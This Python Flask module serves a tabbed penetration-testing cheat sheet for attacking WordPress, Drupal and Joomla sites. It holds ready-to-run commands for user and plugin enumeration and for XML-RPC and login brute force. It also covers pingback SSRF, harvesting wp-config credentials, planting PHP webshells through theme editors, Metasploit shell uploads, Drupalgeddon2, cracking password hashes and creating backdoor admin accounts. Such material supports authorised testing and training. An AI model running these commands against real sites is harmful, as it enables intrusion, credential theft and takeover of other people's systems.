"""CMS enumeration and exploitation, tabbed per platform.

WordPress is the deep tab — full methodology, not just wpscan: fingerprint,
user/plugin/theme enumeration, REST + XML-RPC abuse, brute-force, sensitive-file
hunting, authenticated RCE paths and post-exploitation. Drupal / Joomla / a
generic detection tab round it out.
"""
from flask import Blueprint, render_template

bp = Blueprint("cms", __name__)

# ----------------------------- WordPress ---------------------------------
WORDPRESS = [
    {"title": "1 · Fingerprint & version", "hint": "Confirm it's WP and pin the core version — drives which CVEs apply.", "blocks": [
        {"tpl": "whatweb -a3 http://$RHOST:$RPORT"},
        {"tpl": "curl -s http://$RHOST:$RPORT/ | grep -iE 'wp-content|wp-includes|generator'"},
        {"tpl": "curl -s http://$RHOST:$RPORT/ | grep -oiE 'content=\"WordPress [0-9.]+\"'", "lbl": "meta generator"},
        {"tpl": "curl -s http://$RHOST:$RPORT/readme.html | grep -i version", "lbl": "readme (often left in place)"},
        {"tpl": "curl -s http://$RHOST:$RPORT/wp-links-opml.php | grep -i generator"},
        {"tpl": "curl -s http://$RHOST:$RPORT/feed/ | grep -i generator", "lbl": "RSS generator tag"},
        {"tpl": "curl -s http://$RHOST:$RPORT/wp-includes/css/dashicons.min.css | head", "lbl": "asset ?ver= reveals core"},
    ]},
    {"title": "2 · wpscan (the workhorse)", "hint": "Get a free API token from wpscan.com for vuln data. --enumerate: u=users vp/vt=vuln plugins/themes ap/at=all.", "blocks": [
        {"tpl": "wpscan --url http://$RHOST:$RPORT --enumerate u,vp,vt,cb,dbe --api-token <token>"},
        {"tpl": "wpscan --url http://$RHOST:$RPORT --enumerate ap,at --plugins-detection aggressive --api-token <token>", "lbl": "aggressive plugin/theme sweep"},
        {"tpl": "wpscan --url http://$RHOST:$RPORT -e u --passwords $WORDLIST", "lbl": "enum users then brute"},
        {"tpl": "wpscan --url http://$RHOST:$RPORT --random-user-agent --force --disable-tls-checks", "lbl": "evade / stubborn targets"},
    ]},
    {"title": "3 · Enumerate users", "hint": "Usernames feed brute-force and confirm valid logins via the login oracle.", "blocks": [
        {"tpl": "curl -s 'http://$RHOST:$RPORT/wp-json/wp/v2/users' | jq '.[].slug'", "lbl": "REST users (very common leak)"},
        {"tpl": "curl -s 'http://$RHOST:$RPORT/?rest_route=/wp/v2/users' | jq '.[].slug'", "lbl": "when pretty perms are off"},
        {"tpl": "for i in $(seq 1 10); do curl -s -o /dev/null -w \"%{http_code} %{redirect_url}\\n\" \"http://$RHOST:$RPORT/?author=$i\"; done", "lbl": "?author=N -> /author/<name> redirect"},
        {"tpl": "curl -s http://$RHOST:$RPORT/wp-sitemap-users-1.xml", "lbl": "author sitemap"},
        {"tpl": "curl -s http://$RHOST:$RPORT/wp-json/oembed/1.0/embed?url=http://$RHOST:$RPORT/?p=1 | jq .author_name"},
        {"tpl": "wpscan --url http://$RHOST:$RPORT --enumerate u1-50"},
    ]},
    {"title": "4 · Enumerate plugins & themes", "hint": "Version in readme.txt/style.css -> searchsploit. Passive misses inactive ones; go aggressive.", "blocks": [
        {"tpl": "wpscan --url http://$RHOST:$RPORT --enumerate ap,at --plugins-detection aggressive"},
        {"tpl": "curl -s http://$RHOST:$RPORT/wp-content/plugins/<plugin>/readme.txt | grep -i 'stable tag'", "lbl": "plugin version"},
        {"tpl": "curl -s http://$RHOST:$RPORT/wp-content/themes/<theme>/style.css | grep -i version", "lbl": "theme version"},
        {"tpl": "curl -s -o /dev/null -w '%{http_code}\\n' http://$RHOST:$RPORT/wp-content/plugins/<plugin>/", "lbl": "dir-listing / exists check"},
        {"tpl": "ffuf -w /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt -u http://$RHOST:$RPORT/wp-content/plugins/FUZZ/ -mc 200,301,403", "lbl": "brute plugin slugs"},
    ]},
    {"title": "5 · REST API abuse", "hint": "Unauth endpoints leak users/content; some plugins expose write ops.", "blocks": [
        {"tpl": "curl -s http://$RHOST:$RPORT/wp-json/ | jq '.routes | keys'", "lbl": "map available routes"},
        {"tpl": "curl -s http://$RHOST:$RPORT/wp-json/wp/v2/users | jq"},
        {"tpl": "curl -s http://$RHOST:$RPORT/wp-json/wp/v2/pages?per_page=100 | jq '.[].link'", "lbl": "hidden/draft pages"},
        {"tpl": "curl -s http://$RHOST:$RPORT/wp-json/wp/v2/media | jq '.[].source_url'", "lbl": "uploaded files"},
        {"tpl": "curl -s http://$RHOST:$RPORT/wp-json/wp/v2/settings", "lbl": "403/leak depending on auth"},
    ]},
    {"title": "6 · XML-RPC abuse", "hint": "xmlrpc.php enables fast brute (multicall amplification), pingback SSRF and DDoS.", "blocks": [
        {"tpl": "curl -s http://$RHOST:$RPORT/xmlrpc.php -d '<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'", "lbl": "list methods"},
        {"tpl": "curl -s http://$RHOST:$RPORT/xmlrpc.php -d '<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>PASS</value></param></params></methodCall>'", "lbl": "single credential test"},
        {"tpl": "system.multicall -> batch hundreds of wp.getUsersBlogs logins in one request", "plain": True, "lbl": "amplified brute (bypasses login rate-limit)"},
        {"tpl": "pingback.ping -> make the server fetch an internal URL", "plain": True, "lbl": "SSRF / port-scan via WP"},
        {"tpl": "curl http://$RHOST:$RPORT/xmlrpc.php -d '<methodCall><methodName>pingback.ping</methodName><params><param><value>http://$LHOST/</value></param><param><value>http://$RHOST:$RPORT/?p=1</value></param></params></methodCall>'", "lbl": "trigger pingback SSRF"},
    ]},
    {"title": "7 · Login brute-force", "hint": "wp-login.php form, or faster over xmlrpc. Enumerate users first.", "blocks": [
        {"tpl": "wpscan --url http://$RHOST:$RPORT -U admin -P $WORDLIST"},
        {"tpl": "wpscan --url http://$RHOST:$RPORT -U users.txt -P $WORDLIST --max-threads 30", "lbl": "over xmlrpc, multi-user"},
        {"tpl": "hydra -l admin -P $WORDLIST $RHOST http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'"},
        {"tpl": "curl -s -d 'log=admin&pwd=x' http://$RHOST:$RPORT/wp-login.php -i | grep -i 'incorrect\\|unknown'", "lbl": "username oracle (invalid user vs bad pass differs)"},
    ]},
    {"title": "8 · Sensitive files & backups", "hint": "Config leaks give DB creds + auth keys; backups give source and hashes.", "blocks": [
        {"tpl": "for e in .bak ~ .save .swp .old .orig .txt; do curl -s -o /dev/null -w \"%{http_code} wp-config.php$e\\n\" http://$RHOST:$RPORT/wp-config.php$e; done", "lbl": "wp-config backups"},
        {"tpl": "curl -s http://$RHOST:$RPORT/wp-config.php.bak | grep -i DB_", "lbl": "DB creds + AUTH keys"},
        {"tpl": "curl -s http://$RHOST:$RPORT/wp-content/debug.log", "lbl": "debug log (paths, errors, sometimes creds)"},
        {"tpl": "curl -s http://$RHOST:$RPORT/wp-content/uploads/ | grep -i 'index of'", "lbl": "open uploads listing"},
        {"tpl": "ffuf -w $WORDLIST -u http://$RHOST:$RPORT/FUZZ -e .zip,.tar.gz,.sql,.bak -mc 200", "lbl": "site/db backup archives"},
        {"tpl": "curl -s http://$RHOST:$RPORT/wp-content/uploads/dump.sql | head", "lbl": "leaked DB dump"},
    ]},
    {"title": "9 · Authenticated RCE (as admin)", "hint": "Once you have wp-admin: turn a write primitive into code execution.", "blocks": [
        {"tpl": "Appearance > Theme File Editor > edit 404.php -> <?php system($_GET['c']); ?>", "plain": True, "lbl": "theme editor webshell"},
        {"tpl": "curl 'http://$RHOST:$RPORT/wp-content/themes/<theme>/404.php?c=id'", "plain": True, "lbl": "trigger it"},
        {"tpl": "Plugins > Add New > Upload a zipped malicious plugin (php webshell in header)", "plain": True, "lbl": "upload-plugin path"},
        {"tpl": "msfconsole -q -x 'use exploit/unix/webapp/wp_admin_shell_upload; set RHOSTS $RHOST; set USERNAME admin; set PASSWORD <pw>; run'", "lbl": "metasploit admin->shell"},
        {"tpl": "Media upload: rename shell.php -> shell.phtml / shell.php.jpg + .htaccess trick", "plain": True, "lbl": "if editor is locked (DISALLOW_FILE_EDIT)"},
    ]},
    {"title": "10 · Known-plugin exploits", "hint": "Most WP compromises are a vulnerable plugin, not core.", "blocks": [
        {"tpl": "searchsploit wordpress <plugin>"},
        {"tpl": "searchsploit -m <id> && cat <exploit>", "lbl": "pull PoC locally"},
        {"tpl": "nuclei -u http://$RHOST:$RPORT -tags wordpress,cve", "lbl": "template-based vuln scan"},
        {"tpl": "wpscan --url http://$RHOST:$RPORT --enumerate vp --api-token <token>", "lbl": "map plugins->CVEs"},
    ]},
    {"title": "11 · Post-exploit / creds", "hint": "wp_users store phpass hashes; wp-config has DB creds to pivot.", "blocks": [
        {"tpl": "grep -E 'DB_USER|DB_PASSWORD|DB_HOST|DB_NAME' wp-config.php", "lbl": "from shell/leak"},
        {"tpl": "mysql -h <DB_HOST> -u <DB_USER> -p<DB_PASS> <DB_NAME> -e 'select user_login,user_pass from wp_users;'"},
        {"tpl": "hashcat -m 400 hashes.txt $PASSLIST", "lbl": "phpass $P$ / $H$ hashes"},
        {"tpl": "john --format=phpass hashes.txt --wordlist=$PASSLIST"},
        {"tpl": "wp user create pwn pwn@x.com --role=administrator --user_pass=Pwn123! --path=/var/www/html", "lbl": "wp-cli persistence"},
        {"tpl": "wp user update admin --user_pass=Pwn123! --path=/var/www/html", "lbl": "takeover existing admin"},
    ]},
]

# ------------------------------- Drupal ----------------------------------
DRUPAL = [
    {"title": "Fingerprint & version", "blocks": [
        {"tpl": "droopescan scan drupal -u http://$RHOST:$RPORT"},
        {"tpl": "curl -s http://$RHOST:$RPORT/CHANGELOG.txt | head", "lbl": "version (older installs)"},
        {"tpl": "curl -s http://$RHOST:$RPORT/core/CHANGELOG.txt | head", "lbl": "D8+"},
        {"tpl": "curl -s -I http://$RHOST:$RPORT | grep -i x-generator"},
    ]},
    {"title": "Enumerate", "blocks": [
        {"tpl": "curl -s http://$RHOST:$RPORT/user/1", "lbl": "user probe"},
        {"tpl": "curl -s http://$RHOST:$RPORT/?q=user/register", "lbl": "open registration?"},
        {"tpl": "droopescan scan drupal -u http://$RHOST:$RPORT -e p,t,u"},
    ]},
    {"title": "Exploit (Drupalgeddon family)", "hint": "Version-dependent; verify before firing.", "blocks": [
        {"tpl": "searchsploit drupal"},
        {"tpl": "msfconsole -q -x 'use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS $RHOST; run'", "lbl": "CVE-2018-7600 (<=7.58/8.5.1)"},
        {"tpl": "PHP filter module + admin -> paste PHP into a node", "plain": True, "lbl": "classic authed RCE"},
    ]},
]

# ------------------------------- Joomla ----------------------------------
JOOMLA = [
    {"title": "Fingerprint & version", "blocks": [
        {"tpl": "joomscan -u http://$RHOST:$RPORT"},
        {"tpl": "curl -s http://$RHOST:$RPORT/administrator/manifests/files/joomla.xml | grep -i version"},
        {"tpl": "curl -s http://$RHOST:$RPORT/language/en-GB/en-GB.xml | grep -i version"},
        {"tpl": "curl -s http://$RHOST:$RPORT/README.txt | head"},
    ]},
    {"title": "Enumerate & brute", "blocks": [
        {"tpl": "joomscan -u http://$RHOST:$RPORT --enumerate-components"},
        {"tpl": "curl -s http://$RHOST:$RPORT/administrator/", "lbl": "admin login"},
        {"tpl": "hydra -l admin -P $WORDLIST $RHOST http-post-form '/administrator/index.php:username=^USER^&passwd=^PASS^:Username and password do not match'"},
    ]},
    {"title": "Authenticated RCE", "blocks": [
        {"tpl": "Templates > edit index.php/error.php -> <?php system($_GET['c']);?>", "plain": True, "lbl": "template editor webshell"},
        {"tpl": "searchsploit joomla <component>"},
    ]},
]

# ------------------------------ Generic ----------------------------------
GENERIC = [
    {"title": "Identify the CMS", "blocks": [
        {"tpl": "whatweb -a3 http://$RHOST:$RPORT"},
        {"tpl": "cmseek -u http://$RHOST:$RPORT"},
        {"tpl": "curl -s http://$RHOST:$RPORT/robots.txt", "lbl": "paths often name the CMS"},
        {"tpl": "curl -s -I http://$RHOST:$RPORT | grep -iE 'x-powered-by|x-generator|set-cookie'"},
        {"tpl": "nuclei -u http://$RHOST:$RPORT -tags tech,cms", "lbl": "tech + CMS detection"},
    ]},
    {"title": "General content discovery", "blocks": [
        {"tpl": "feroxbuster -u http://$RHOST:$RPORT -w $WORDLIST -x php,txt,bak,zip"},
        {"tpl": "gobuster dir -u http://$RHOST:$RPORT -w $WORDLIST -x php,txt,html"},
        {"tpl": "curl -s http://$RHOST:$RPORT/sitemap.xml"},
    ]},
]

TABS = [
    ("wordpress", "WordPress", WORDPRESS),
    ("drupal", "Drupal", DRUPAL),
    ("joomla", "Joomla", JOOMLA),
    ("generic", "Generic", GENERIC),
]


@bp.route("/cms")
def index():
    return render_template("tabcheat.html", active="cms", pkey="cms",
                           title="CMS", tag="exploitation",
                           intro="CMS enumeration and exploitation. WordPress is the deep tab "
                                 "(full methodology); Drupal, Joomla and a generic detection tab follow.",
                           tabs=TABS)


MODULE = {"id": "cms", "title": "CMS", "category": "Exploitation",
          "order": 3, "blueprint": bp, "endpoint": "cms.index"}
